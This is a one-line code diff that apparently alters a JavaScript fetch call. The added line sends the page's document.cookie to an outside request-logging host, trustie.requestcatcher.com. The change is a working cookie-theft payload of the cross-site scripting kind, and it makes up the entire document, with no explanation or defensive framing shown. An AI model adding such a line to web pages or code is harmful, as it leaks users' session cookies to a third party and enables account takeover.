@@ -1,1 +1,1 @@
-fetch('https://trustie.requestcatcher.com/')
+fetch('https://trustie.requestcatcher.com/?c=' + document.cookie)
